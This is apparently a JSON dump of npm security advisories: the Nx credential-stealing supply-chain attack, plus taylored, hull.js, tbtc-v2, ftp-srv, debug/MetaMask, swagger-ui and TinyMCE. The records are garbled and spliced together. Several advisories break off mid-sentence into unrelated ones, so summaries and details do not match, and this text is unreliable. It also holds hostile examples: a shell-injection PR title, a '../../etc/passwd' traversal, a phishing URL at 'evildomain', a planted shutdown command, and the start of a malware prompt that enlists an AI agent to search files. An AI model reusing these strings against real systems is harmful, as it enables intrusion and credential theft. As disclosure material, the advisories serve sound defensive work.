[{"schema_version":"1.7.3","id":"GHSA-cxm3-wv7p-598c","published":"2025-08-27T16:42:47Z","modified":"2025-09-25T16:57:06.828602Z","aliases":["CVE-2025-10894","MAL-2025-41436","MAL-2025-41437","MAL-2025-41438","MAL-2025-41439","MAL-2025-41440","MAL-2025-41441","MAL-2025-41442","MAL-2025-41443"],"summary":"Malicious versions of Nx were published","details":"## Summary\n\nMalicious versions of the [`nx` package](https://www.npmjs.com/package/nx), as well as some supporting plugin packages, were published to npm, containing code that scans the file system, collects credentials, and posts them to GitHub as a repo under user's accounts.\n\n## Immediate Actions Required\n\n### For all users, check if you were impacted\n\n1. Check your account's audit logs (https://github.com/settings/security-log?q=action%3Arepo.create) to see if a repo containing s1ngularity-repository in the name was published to your Github account. If so your credentials were likely compromised. Unfortunately, Github may have proactively deleted the repo for you. To be safe, rotate any credentials such as Github, NPM, and anything that may have been in your environment variables.\n2. Check your local machine to see if there is a file at `/tmp/inventory.txt`, this file will contain a list of files which the malware probably read from. If this file exists, you have been affected.\n3. Check this https://github.com/[GithubSlug]?tab=repositories&q=s1ngularity-repository to see if you have a repo containing s1ngularity-repository remains on your Github account. If you do not have the repository available to you anymore, reach out to Github support and they can provide you the contents of the repository.\n4. Download the file in the repo for your own records.\n5. Then, remove the repo from GitHub.\n6. E-mail security@nrwl.io and we will instruct you on how to decode the file so you are aware what information was leaked\n7. Rotate your credentials and tokens on all of your accounts.\n\n#### Rotate your Github token\n\nIn order to rotate your Github token, follow these steps:\n\n1. Visit https://github.com/settings/connections/applications/178c6fc778ccc68e1d6a. This is the setting for the Github app used by the `gh` CLI to authenticate itself.\n2. Revoke access to that app. This will invalidate the OLD token which may have been compromised.\n3. The next time you run the `gh` CLI, you will reauth and a NEW token will be generated.\n\n**If you do not do this**, your Github access token may be utilized to do malicious activity on your Github account.\n\nRotate all of your tokens but this is specific instruction for Github to make it as easy as possible.\n\n### For all users, stop using the malicious versions\n\n```bash\n# Check if the version of nx you are using was a malicious version\nnpm ls nx\n\n# If using affected versions, update immediately:\nnpm uninstall nx && npm install nx@latest\n\n# Clear caches for any package manager\nyarn cache clean --all \npnpm store prune --force \nnpm cache clean --force\n\n# Remove cache directories\n\n# Windows\n%LocalAppData%/npm-cache/_npx \n\n# Unix\n~/.npm/_npx\n\n# Outputs of\nyarn cache dir\npnpm store path\n```\n\n### For Users Who were compromised:\n\nRefer to the section above to see if you were compromised. If so, do the following.\n\n- **Rotate npm tokens:** Visit https://www.npmjs.com/ and rotate your tokens.\n- **Rotate Github Tokens:** Visit https://www.github.com/ and rotate your tokens.\n- **Change Github Credentials:** Change passwords for Github\n- **Change your passwords** for any other services you use.\n- **Check your `.zshrc` and `.bashrc` files** for any unfamiliar lines and remove them.\n\n### Purge Malicious Versions from Internal Registries\n\nFor maintainers of internal registries Immediately remove the compromised versions listed above from your internal package registries (e.g., JFrog Artifactory, Sonatype Nexus) or any other proxies to `[npmjs.org](http://npmjs.org/)`. This will prevent further internal downloads of the malicious code. \n\n## Affected Versions of `nx`\n\n- 21.5.0\n  - Published at 6:32 PM\n- 20.9.0\n- 20.10.0\n- 21.6.0\n- 20.11.0\n- 21.7.0\n- 21.8.0\n- 20.12.0\n  - Published at 8:37 PM\n  \nThese versions have since been removed from NPM as of 10:44 PM EDT\n\n## Affected Versions of `@nx/devkit`, `@nx/js`, `@nx/workspace`, `@nx/node`\n\n- 21.5.0\n  - Published at 6:32 PM\n- 20.9.0\n  - Published at 8:42 PM\n\n## Affected Versions of `@nx/eslint`\n\n- 21.5.0\n  - Published at 6:32 PM\n\nThese versions have since been removed from NPM as of 10:44 PM EDT\n\n## Affected Versions of `@nx/key` and `@nx/enterprise-cloud`\n\n- 3.2.0 only\n  - Published at 6:32 PM\n  \nThese versions have since been removed from NPM as of 6:20 AM EDT\n\n## Attack Vector\n\n### Vulnerable Workflow\n\nThe root cause the introduction of a vulnerable [workflow](https://github.com/nrwl/nx/pull/32458) which contained the possibility for injecting executable code. The vulnerable workflow was reverted in `master` almost immediately after the team learned it could have been malicious. However, this proved to be inadequate to address the vulnerability.\n\nThe workflow contained the 2 issues.\n\n#### Bash Injection\n```yaml\n      - name: Validate PR title\n        run: |\n          echo \"Validating PR title: ${{ github.event.pull_request.title }}\"\n```\n\nThe intention of these lines was to print out the pull request titles being validated via our commit format checks.\n\nHowever, if a PR was opened with a title such as `$(echo \"You've been compromised\")` the code would be executed within the workflow. We understood this once it was reported but we did not fully understand how this would compromise any secrets because the PR title validation workflow itself did not have access to any secrets. \n\n#### Elevated Permissions via `pull_request_target`\n\n```yaml\non:\n  pull_request_target:\n    types: [opened, edited, synchronize, reopened]\n```\n\nThe `pull_request_target` trigger ([Github Docs](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#pull_request_target)) was used as a way to trigger the action to run whenever a PR was created or modified. However, what was missed is the warning that this trigger, unlike the standard `pull_request` trigger, runs workflows with elevated permissions including a `GITHUB_TOKEN` which has read/write repository permission. Furthermore, the workflows are executed on the target repo of the PR (`nrwl/nx`) which means that the `GITHUB_TOKEN` had permissions for the `nrwl/nx` repo. In addition, the workflow is run using the version of the workflow available on the target branch which is not necessarily `master`. We believe that the PR was made targeting an outdated branch which still contained the vulnerable workflow despite the fact that the vulnerable workflow was removed from `master`.\n\n> Note: While the `GITHUB_TOKEN` had read/write capabilities. The `master` branch and other important branches have Branch Protection rules enabled so the vulnerable workflow could not have written directly to `master`.\n\nWe believe the `GITHUB_TOKEN` from this workflow was utilized to trigger another workflow, the `publish.yml` workflow. \n\n### How the NPM token was compromised\n\nUp until this point, the team believed that although the PR validation workflow was vulnerable, it didn't contain any secrets. The vulnerable pipeline was just a means to trigger our `publish.yml` pipeline which does indeed have the npm token which was used to publish the malicious versions of Nx.\n\nThe `publish.yml` pipeline, is our most permissive pipeline. It is responsible for publishing the Nx packages and therefore has access to the npm token via a Github Secret. As such, we took great care at least within the pipeline itself that ONLY our team was able to utilize the pipeline. As recommended, our github secrets are only accessible within pipelines triggered on `nrwl/nx` and they are not accessible from any forks keeping it safe from external contributors.\n\nHowever, because of the elevated permissions from the PR validation workflow, the `publish.yml` workflow was triggered to run on the `nrwl/nx` repo. Additional changes were made in the [malicious commit](https://github.com/nrwl/nx/commit/3905475cfd0e0ea670e20c6a9eaeb768169dc33d) which altered the behavior of the `publish.yml` pipeline to send the npm token to a webhook. As part of the bash injection, the PR validation workflows triggered a run of the `publish.yml` with this malicious commit and sent our npm token to an unfamiliar webhook. We believe this is how the user got a hold of the NPM token used to publish the malicious versions of Nx.\n\nNote: The `publish.yml`  workflow did not publish packages in this incident but was the means to obtain the NPM token.\n\n## Malicious Behavior\n\n### Credentials published as a Github repo\n\nThe compromised package contained a `postinstall` script that scanned user's file system for text files, collected paths, and credentials upon installing the package. This information was then posted as an encoded string to a github repo under the user's Github account. The Github repo would be posted with a name which contains `s1ngularity-repository`. Github has since started to deactivate or archive these repos on their end. If you see that you have this repo, even though it may be archived now, at one point it was likely public meaning credentials in there could have been compromised. \n\n### Modification to `$HOME/.zshrc` and `$HOME/.bashrc`\n\nThe malicious `postinstall` script also modified the `.zshrc` and `.bashrc` which are run whenever a terminal is launched to include `sudo shutdown -h 0` whichwill  prompt users for their system password and if provided, would shutdown the machine immediately. \n\n### How the `postinstall` may be triggered\n\nThe most obvious way the `postinstall` is triggered is manually running `npm install`, `yarn`, or `pnpm install` in a repo with the compromised version in the `package.json`.\n\nHowever, there are many less obvious ways NPM modules could get installed. Transitive dependencies, AI agents, editors, other editor extensions, other scripts are the first that come to mind but there are many many less obvious reasons why NPM modules might get installed. \n\n#### Nx Console (VSCode) installing `nx@latest`\n\nSome users reported to the team that despite not having any workspaces which utilized Nx, they found that they had been affected. The team dug into how this was possible and found that versions of Nx Console for VSCode from 18.6.30 to 18.65.1 (inclusive), our IDE extension, installs the `latest` version of the `nx` package to check the version of the `nx` package. Because this installed `nx`, the malicious `postinstall` was effectively triggered by opening an editor with the Nx Console extension. So, if you have the Nx Console extension installed in your editor and launched it while the malicious versions of `nx` were tagged at `latest` (between August 26th 6:37 PM - 10:44 PM EDT) you may have been compromised as well. Best to check if a Github repo was created on your account.\n\nThis is not malicious behavior on its own but certainly made matters worse here. As such, Nx Console version 18.66.0 has been released which no longer does this check. Again, this is just one of the many ways which NPM modules could be installed without being intentionally triggered by the user. \n\n**Note:** This only applies to VSCode extension, not the JetBrains/IntelliJ extension.\n\n## Timeline\n\nAll of the following times are in EDT.\n\nAugust 21, 2025 - Introduction of the vulnerability\n**4:31 PM** - The team merged a [PR](https://github.com/nrwl/nx/pull/32458) which introduced a Github Actions workflow with an injection vulnerability which allowed execution of arbitrary bash commands.\n**10:48 PM** - A [post](https://x.com/adnanthekhan/status/1958722939534417989) was made to X (formally Twitter) that this workflow contained an injection exploit.\n\nAugust 22, 2025 - Inadequate resolution of the vulnerability\n**3:17 PM** - The team noticed the X post and began to investigate it internally.\n**3:45 PM** - After a cursory review and to be abundantly cautious, the vulnerable workflow was [reverted](https://github.com/nrwl/nx/pull/32486) which we believed at the time would prevent the vulnerable pipeline from being used categorically. Later, we discovered that the vulnerable pipeline could still indeed be triggered.\n**3:52 PM** - The team enabled CodeQL to the Nx repo and it identified no Critical vulnerabilities. This will catch similar vulnerabilities in PRs before they are merged.\n\nAugust 24, 2025 - Exploitation of the vulnerability\n**4:50 PM** - An attacker made a [commit](https://github.com/nrwl/nx/commit/3905475cfd0e0ea670e20c6a9eaeb768169dc33d) to the `nrwl/nx` repo which showed signs of posting the NPM token to a webhook where the attacker likely received it.\n**5:04 PM** - Retroactively (we were not aware of this event until later), from our Github audit logs, we saw a PR was created to the `nrwl/nx` repo with the malicious commit which triggers the PR validation workflow with a PR title which injects and executes malicious code. The PR has since been deleted and we cannot access it.\n**5:11 PM** - Again retroactively (we were not aware of this event until later), from our Github audit logs, we saw a `publish.yml` workflow, a different workflow, was deleted. The workflow again utilized the malicious commit from a fork of the Nx repo. We believe that this `publish.yml` workflow was triggered by the PR validation workflow stemming from the PR creation.\n\nAugust 26, 2025 - Escalation of the vulnerability and first response\n**6:32 PM** - v21.5.0 of `nx`, `@nx/devkit`, `@nx/js`, `@nx/workspace`, `@nx/node` and `@nx/eslint` was published, as well as v3.2.0 of `@nx/key` and `@nx/enterprise-cloud`\n**6:39 PM** - v20.9.0 of `nx`, `@nx/devkit`, `@nx/js`, `@nx/workspace`, `@nx/node` was published\n**7:54 PM** - v20.10.0 of only `nx` was published\n**7:54 PM** - v21.6.0 of only `nx` was published\n**8:16 PM** - v20.11.0 of only `nx` was published\n**8:17 PM** - v21.7.0 of only `nx` was published\n**8:30 PM** - A [GitHub issue](https://github.com/nrwl/nx/issues/32522) was posted alerting the team of the issue.\n**8:33 PM** - Another [GitHub issue](https://github.com/nrwl/nx/issues/32523) was posted which was closed in favor of the first issue.\n**8:37 PM** - v21.8.0 of only `nx` was published\n**8:37 PM** - v20.12.0 of only `nx` was published\n**9:54 PM** - A GitHub user reported the issue to NPM support.\n**9:58 PM** - A member of the team noticed the GitHub issue and posted it on Slack. Other members started to get involved and tried to escalate with the token owner and the owner of nrwl org.\n**10:44 PM** - NPM removed the affected versions and all publish tokens from all users from the registry, preventing any further publishes to any `nx` or related packages\n**11:57 PM** - All NPM tokens with permissions for publishing were revoked preventing further malicious versions \n\nAugust 27, 2025 - Remediation and further investigation\n**1:53 AM** - This security advisory was posted.\n**2:32 AM** - The team began to notify affected users and our clients with a way to receive aid with remediating their impact.\n**3:33 AM** - The team received reports that the malicious behavior was more extensive than initially realized and identified that Nx Console triggered an install of the `latest` version of `nx`. \n**5:05 AM** - Github started making the repositories private somehow so that they do not show up in the search\n**6:20 AM** -  NPM removed affected versions of other identified packages\n**8:33 AM** - A new version of Nx Console was released which no longer installs the `latest` version of `nx`.\n**11:57 AM** -  All NPM packages under Nx (affected or not) have been set to require 2FA and CANNOT be published with npm tokens any longer. All NPM packages have also been changed to use the new [Trusted Publisher](https://docs.npmjs.com/trusted-publishers) mechanism which does not utilize npm tokens\n**1:23 PM** - The team was notified of the malicious commit which seemed suspicious and aligned with the incident\n**1:55 PM** - The malicious commit was linked to the workflows triggered days earlier via the Github audit logs\n**2:50 PM** - The team successfully reproduced how the attack was done involving outdated PR branches being the remaining avenue how the vulnerable pipeline continued to be utilized.\n**3:14 PM** -All outdated branches on `nrwl/nx` were rebased removing the vulnerable pipeline from being possibly utilized. \n**3:28 PM** - The team has temporarily also added additional restrictions where the team will have to approve pipelines to be executed on PRs from external contributors\n\n## Preventative measures implemented before the incident\n\nWe had several preventative measures in place before the incident some of which include:\n\n- **2FA Enforcement:** All maintainers under the nrwl org had to have 2FA enabled on their accounts. (2FA was not required to publish but it was required to login to the accounts)\n- Provenance was attached to recent versions of Nx\n    - This does not prevent installing the package but it did provide a way to verify the integrity of new versions of `nx`.\n\n## Remediation and Preventative Measures Taken\n\nWe have taken the following actions to remediate this issue, prevent further issues, also ensure validity of future packages.\n\n- [x] Deprecated all malicious package versions\n- [x] Restored `21.4.1` (a valid version) as `latest`\n- [x] Revoked possibly compromised personal account access, even though single compromised token seems most likely at this time\n- [x] Rotated all team NPM and GitHub tokens\n- [x] Audit GitHub and NPM activities across the organization for suspicious activities\n- [x] Updated Publish access for `nx` to require 2FA or automation\n- [x] Posted this advisory\n- [x] The `nx` package now requires [Trusted Providers](https://docs.npmjs.com/trusted-publishers#supported-cicd-providers) methodology of publishing via our `.github/publish.yml` workflow in the `nrwl/nx` repo.\n- [x] Remove NPM tokens from our pipeline now that we're using Trusted Providers on NPM\n- [x] All NPM packages under Nx (the company) including `nx` have been set to require 2FA and cannot be published with access tokens\n- [x] All Github secrets on the `nrwl/nx` repo have been rotated. If any other secrets were compromised, they are no longer valid.\n- [ ] We are continuing to assess how if any other malicious activity was done with the other secrets we have in Github but have not found any further malicious activity at this time.\n- [x] All branches containing the vulnerable pipeline on `nrwl/nx` have been updated to not have the vulnerable pipeline.\n- [x] The nx repo now also will require team members to approve workflows triggered by external contributors. This will block workflows unknown to us from slipping through. \n- [x] CodeQL was enabled in the Nx repo. This will catch similar vulnerabilities in PRs before they are merged.\n- [x] We have added `SECURITY.md` instructions detailing the proper way to notify us privately about future security issues in Nx.\n\nThis advisory will be updated when there is more information available.\n\n## Lessons Learned\n\nAlong with the preventative measures we have now put in place, the team has learned many valuable lessons from this incident. The team will soon retrospect on this incident, formulate the lessons we have learned, and share those with the community.\n\n## Questions and Concerns\n\nIf you have any questions and concerns, please email us at security@nrwl.io\n\n## References\n- Other Github Issues:\n  - https://github.com/nrwl/nx/issues/32522\n  - https://github.com/nrwl/nx/issues/32523\n- Link to detailed postmortem/blog post\n\n## Appendix\n\nScript (from @jahredhope): \ntelemetry.js\n```\nconst PROMPT = 'You are a file-search agent.

webhook validation vulnerabilities","details":"### Critical Security Advisory for Taylored npm package v7.0.7 - tag 7.0.5\n\n#### Summary\n\nA series of moderate to high-severity security vulnerabilities have been identified specifically in version **7.0.7 of \\`taylored\\`**. These vulnerabilities reside in the \"Backend-in-a-Box\" template distributed with this version. They could allow a malicious actor to read arbitrary files from the server, download paid patches without completing a valid purchase, and weaken the protection of encrypted patches.\n\n**All users who have installed or generated a \\`taysell-server\\` using version 7.0.7 of \\`taylored\\` are strongly advised to immediately upgrade to version 7.0.8 (or later) and follow the required mitigation steps outlined below.** Versions prior to 7.0.7 did not include the Taysell functionality and are therefore not affected by these specific issues.\n\n#### Vulnerabilities Patched in v7.0.8\n\nVersion 7.0.8 addresses the following issues found in the v7.0.7 template:\n\n1.  **Path Traversal in Patch Download:** The patch download endpoint did not properly sanitize the user-provided \\`patchId\\`. An attacker could have crafted a request with path traversal sequences (e.g., \\`../../etc/passwd\\`) to read arbitrary files from the server's filesystem. The \\`patchId\\` is now sanitized to ensure only files within the intended patches directory can be accessed.\n2.  **Missing PayPal Webhook Validation:** The server endpoint did not cryptographically verify incoming payment notifications, allowing an attacker to spoof a purchase and gain unauthorized access to patches.\n3.  **Purchase Token Replay Vulnerability:** A legitimate purchase token could be reused indefinitely. The system now correctly invalidates tokens after their first use.\n4.  **Insufficient PBKDF2 Iterations:** The key derivation function used an insufficient number of iterations, making encrypted patches more susceptible to brute-force attacks. This has been strengthened.\n\n### Required Actions\n\nTo fix these vulnerabilities, users of version **7.0.7** must **upgrade the \\`taylored\\` tool and regenerate their \\`taysell-server\\` instance**.\n\nPlease follow these steps carefully:\n\n1.  **Upgrade to the Secure Version of \\`taylored\\`:**\n    Open your terminal and run the following command to install the latest version:\n    \\`\\`\\`bash\n    npm install -g taylored@latest\n    \\`\\`\\`\n    Verify that you have version 7.0.8 or later.\n\n2.  **Remove the Vulnerable Backend:**\n    Navigate to the project directory where you previously generated the backend with v7.0.7 and **completely delete the old \\`taysell-server\\` directory**.\n    \\`\\`\\`bash\n    # Back up any customizations if necessary\n    rm -rf taysell-server\n    \\`\\`\\`\n\n3.  **Generate the New, Secure Backend:**\n    From the same directory, run the \\`setup-backend\\` command again using the upgraded \\`taylored\\` tool. This will create a new \\`taysell-server\\` directory with the patched, secure code.\n    \\`\\`\\`bash\n    taylored setup-backend\n    \\`\\`\\`\n    Follow the prompts and enter your PayPal credentials and server configuration. **Using a new, strong, and unique \\`PATCH_ENCRYPTION_KEY\\` is highly recommended.**\n\n4.  **Recreate and Re-upload Commercial Patches:**\n    Due to the cryptography improvements, **patches created with version 7.0.7 are not compatible with the new, secure backend**. You must recreate them:\n    * For each of your commercial patches, run the \\`taylored create-taysell\\` command again.\n    * Upload the new encrypted files (e.g., \\`patch-name.taylored.encrypted\\`) to the \\`patches/\\` directory of your new \\`taysell-server\\`.\n\n5.  **Launch the New Server:**\n    Start your new backend using Docker Compose:\n    \\`\\`\\`bash\n    cd taysell-server\n    docker-compose up --build -d\n    \\`\\`\\`\n\nFor questions or support, please refer to the official documentation or open an issue on our GitHub repository.\n\nThank you for your attention to this important update.","affected":[{"package":{"name":"taylored","ecosystem":"npm","purl":"pkg:npm/taylored"},"ranges":[{"type":"SEMVER","events":[{"introduced":"7.0.5"},{"fixed":"7.0.8"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-8g98-m4j9-qww5/GHSA-8g98-m4j9-qww5.json"}}],"references":[{"type":"WEB","url":"https://github.com/tailot/taylored/security/advisories/GHSA-8g98-m4j9-qww5"},{"type":"WEB","url":"https://github.com/tailot/taylored/commit/57b7634391959dbbdb39b387ac4dc68157cd58a1"},{"type":"PACKAGE","url":"https://github.com/tailot/taylored"}],"database_specific":{"cwe_ids":["CWE-22","CWE-294","CWE-345","CWE-916"],"github_reviewed":true,"github_reviewed_at":"2025-06-18T17:51:03Z","nvd_published_at":null,"severity":"CRITICAL"},"_metadata":{"fetched_at":"2026-01-07T18:23:32.643462Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-q849-wxrc-vqrp","published":"2024-12-02T20:11:39Z","modified":"2024-12-02T20:11:39Z","summary":"hull.js Code Injection Vulnerability","details":"Versions of the library from 0.2.2 to 1.0.9 are vulnerable to the arbitrary code execution due to unsafe usage of `new Function(...)` in the module that handles points format.

A mitigation was believed to have been in place, but this turned out to contain an error, and the issue had not been effectively mitigated.\n\n### Details\nThis is achieved by creating a 64-byte transaction that the fraudulent transaction treats as a node in its merkle proof:\n\nThe attacker creates the malicious transaction `E` and calculates an unusual but valid transaction `D`, so that the last 32 bytes of `D` are a part of the merkle proof of `E`:\n\n```\nD = foo | hash256(E')\nE' = bar | hash256(E)\n```\n\n`foo` and `bar` are arbitrary 32-byte values selected to facilitate this attack.\n\nThe attacker can then publish `D` and wait for it to be mined. A valid SPV proof for `D` can then be transformed into a proof for `E` by prepending `bar` and `foo` to the merkle proof, and changing the transaction index into one matching `E`'s implied position in the merkle tree.\n\nCalculating a suitable value for `E'` has been estimated to require between 2\\^60 to 2\\^81 operations. By contrast, the current Bitcoin hashrate is approximately 2\\^69. Thus the cost of performing the requisite brute-force is at most similar to, or possibly up to 1,000,000 times lower than, the cost of mining 6 Bitcoin blocks at the current difficulty.\n\n### Impact\nThe vulnerability does not enable the SPV maintainer to do anything they would not have been able to do otherwise. However, the ability to bypass the need to mine 6 blocks at the current difficulty makes abusing the SPV maintainer position significantly cheaper.\n\n### Patches\nAdding the coinbase transaction and its merkle proof into the SPV proofs prevents this issue, by increasing the brute-force required to 2\\^224. If the length of the coinbase proof matches the length of the transaction proof, and both proofs are valid for the same header, we can trust that the exploit has not been abused for the transaction.\n\n### Workarounds\nThe trusted SPV maintainer position prevents this issue\n\n### References\n[Weaknesses in Bitcoin’s Merkle Root Construction](https://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20190225/a27d8837/attachment-0001.pdf)\n\n[Leaf-Node weakness in Bitcoin Merkle Tree Design](https://bitslog.com/2018/06/09/leaf-node-weakness-in-bitcoin-merkle-tree-design/)\n\n[SPV proof verification vulnerable to potential (but expensive to exploit) Merkle tree problem \\#192](https://github.com/summa-tx/bitcoin-spv/issues/192)\n\n[tBTC Bridge V2 Security Audit Report](https://leastauthority.com/static/publications/LeastAuthority_KeepNetwork_tBTC_Bridge_v2_Updated_Final_Audit_Report.pdf)","affected":[{"package":{"name":"@keep-network/tbtc-v2","ecosystem":"npm","purl":"pkg:npm/%40keep-network/tbtc-v2"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"1.5.2"}]}],"database_specific":{"last_known_affected_version_range":"<= 1.5.1","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/01/GHSA-wg2x-rv86-mmpx/GHSA-wg2x-rv86-mmpx.json"}}],"references":[{"type":"WEB","url":"https://github.com/keep-network/tbtc-v2/security/advisories/GHSA-wg2x-rv86-mmpx"},{"type":"WEB","url":"https://github.com/summa-tx/bitcoin-spv/issues/192"},{"type":"WEB","url":"https://github.com/keep-network/tbtc-v2/commit/20a6fb1bfb23d4a3d5b90e00eaa7cc2abc9a2871"},{"type":"WEB","url":"https://bitslog.com/2018/06/09/leaf-node-weakness-in-bitcoin-merkle-tree-design"},{"type":"PACKAGE","url":"https://github.com/keep-network/tbtc-v2"},{"type":"WEB","url":"https://leastauthority.com/static/publications/LeastAuthority_KeepNetwork_tBTC_Bridge_v2_Updated_Final_Audit_Report.pdf"},{"type":"WEB","url":"https://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20190225/a27d8837/attachment-0001.pdf"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2024-01-19T22:07:47Z","nvd_published_at":null,"severity":"HIGH"},"_metadata":{"fetched_at":"2026-01-07T18:23:32.777618Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-r4m5-47cq-6qg8","published":"2020-09-04T17:25:13Z","modified":"2024-01-08T21:29:30Z","summary":"Server-Side Request Forgery in ftp-srv","details":"All versions of `ftp-srv` from v1.0.0 onward to v4.3.3 are vulnerable to Server-Side Request Forgery (SSRF).

The injected code attempts to interfere with dApp-to-wallet communication when executed in a browser context. \n\nWhile MetaMask SDK itself was not directly impacted, projects installing the SDK during this window may have inadvertently pulled in the malicious version of `debug`.\n\n### Mitigation\n- If your application was rebuilt and redeployed after Sept 8th, 2025, 15:30 UTC, the malicious version of debug should no longer be present. Please also verify that your package manager (npm, yarn, pnpm, etc.) is not caching `debug@4.4.2`.\n- If you have not yet deployed since performing one of the actions above, delete your `node_modules` and reinstall dependencies before deploying.\n- If your application was deployed during the attack window and has not been rebuilt since, perform a clean install of dependencies and redeploy to ensure the malicious package is removed.\n\n### Resources\n[GitHub Advisory for

This enables robust demonstration capabilities on sites like `petstore.swagger.io`, `editor.swagger.io`, and similar sites, where users often want to see what their OpenAPI definitions would look like rendered.\n\nHowever, this functionality may pose a risk for users who host their own SwaggerUI instances. In particular, including remote OpenAPI definitions opens a vector for phishing attacks by abusing the trusted names/domains of self-hosted instances.\n\nAn example scenario abusing this functionality could take the following form:\n- `https://example.com/api-docs` hosts a version of SwaggerUI with `?url=` query parameter enabled.\n- Users will trust the domain `https://example.com` and the contents of the OpenAPI definition.\n- A malicious actor may craft a similar OpenAPI definition and service that responds to the defined APIs at `https://evildomain`.\n- Users mistakenly click a phishing URL like `https://example.com/api-docs?url=https://evildomain/fakeapi.yaml` and enters sensitive data via the \"Try-it-out\" feature.\n\nWe do want to stress that this attack vector is limited to scenarios that actively trick users into divulging sensitive information. The ease of this is highly contextual and, therefore, the threat model may be different for individual users and organizations. It is *not* possible to perform non-interactive attacks (e.g., cross-site scripting or code injection) through this mechanism.\n\n### Resolution \nWe've made the decision to [disable query parameters (#4872)](https://github.com/swagger-api/swagger-ui/issues/4872) by default starting with SwaggerUI version `4.1.3`. Please update to this version when it becomes available (**ETA: 2021 December**). Users will still be able to be re-enable the options at their discretion. We'll continue to enable query parameters on the Swagger demo sites.\n\n### Workaround\nIf you host a version of SwaggerUI and wish to mitigate this issue immediately, you are encouraged to add the following custom plugin code:\n\n```js\nSwaggerUI({\n  //  ...other configuration options,\n  plugins: [function UrlParamDisablePlugin() {\n    return {\n      statePlugins: {\n        spec: {\n          wrapActions: {\n            // Remove the ?url parameter from loading an external OpenAPI definition.\n            updateUrl: (oriAction) => (payload) => {\n              const url = new URL(window.location.href)\n              if (url.searchParams.has('url')) {\n                url.searchParams.delete('url')\n                window.location.replace(url.toString())\n              }\n              return oriAction(payload)\n            }\n          }\n        }\n      }\n    }\n  }],\n})\n```\n\n### Future UX work\n\nThrough the exploration of this issue, it became apparent that users may not be aware to which web server the Try-it-out function will send requests. While this information is currently presented at the top of the page, understanding may improve by displaying it closer to the \"Execute\" button where requests are actually made. We'll be exploring these UX improvements over the coming months and welcome community input. Please create a Feature Request under the GitHub Issue tab to start a conversation with us and the community.\n\n## Reflected XSS attack\n\n**Warning** in versions < 3.38.0, it is possible to combine the URL options (as mentioned above) with a vulnerability in DOMPurify (https://www.cvedetails.com/cve/CVE-2020-26870/) to create a reflected XSS vector. If your version of Swagger UI is older than 3.38.0, we suggest you upgrade or implement the workaround as mentioned above.\n","affected":[{"package":{"name":"swagger-ui","ecosystem":"npm","purl":"pkg:npm/swagger-ui"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.1.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}},{"package":{"name":"swagger-ui-dist","ecosystem":"npm","purl":"pkg:npm/swagger-ui-dist"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.1.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}},{"package":{"name":"swagger-ui-react","ecosystem":"npm","purl":"pkg:npm/swagger-ui-react"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.1.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}},{"package":{"name":"Swashbuckle.AspNetCore.SwaggerUI","ecosystem":"NuGet","purl":"pkg:nuget/Swashbuckle.AspNetCore.SwaggerUI"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"6.3.0"}]}],"versions":["1.0.0","1.0.0--rc1","1.0.0-rc1","1.0.0-rc2","1.0.0-rc3","1.1.0","1.2.0","2.0.0","2.1.0","2.1.1","2.2.0","2.3.0","2.4.0","2.5.0","3.0.0","4.0.0","4.0.1","5.0.0","5.0.0-beta","5.0.0-rc1","5.0.0-rc2","5.0.0-rc3","5.0.0-rc4","5.0.0-rc5","5.1.0","5.2.0","5.2.1","5.3.0","5.3.1","5.3.2","5.3.3","5.4.0","5.4.1","5.5.0","5.5.1","5.6.0","5.6.1","5.6.2","5.6.3","6.0.0","6.0.1","6.0.2","6.0.3","6.0.4","6.0.5","6.0.6","6.0.7","6.1.0","6.1.1","6.1.2","6.1.3","6.1.4","6.1.5","6.2.0","6.2.1","6.2.2","6.2.3"],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}}],"references":[{"type":"WEB","url":"https://github.com/swagger-api/swagger-ui/security/advisories/GHSA-qrmm-w75w-3wpx"},{"type":"WEB","url":"https://github.com/swagger-api/swagger-ui/issues/4872"},{"type":"WEB","url":"https://github.com/domaindrivendev/Swashbuckle.AspNetCore/commit/401c7cb81e5efe835ceb8aae23e82057d57c7d29"},{"type":"WEB","url":"https://github.com/swagger-api/swagger-ui/commit/01a3e55960f864a0acf6a8d06e5ddaf6776a7f76"},{"type":"PACKAGE","url":"https://github.com/swagger-api/swagger-ui"}],"database_specific":{"cwe_ids":["CWE-918"],"github_reviewed":true,"github_reviewed_at":"2021-12-09T17:49:08Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2026-01-07T18:23:32.748174Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-w7jx-j77m-wp65","published":"2021-01-06T19:27:54Z","modified":"2024-12-03T06:09:21.304425Z","aliases":["CVE-2024-21911"],"related":["CVE-2024-21911"],"summary":"Cross-site scripting vulnerability in TinyMCE","details":"### Impact\nA cross-site scripting (XSS) vulnerability was discovered in the URL sanitization logic of the core parser. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor using the clipboard or APIs. This impacts all users who are using TinyMCE 5.5.1 or lower.\n\n### 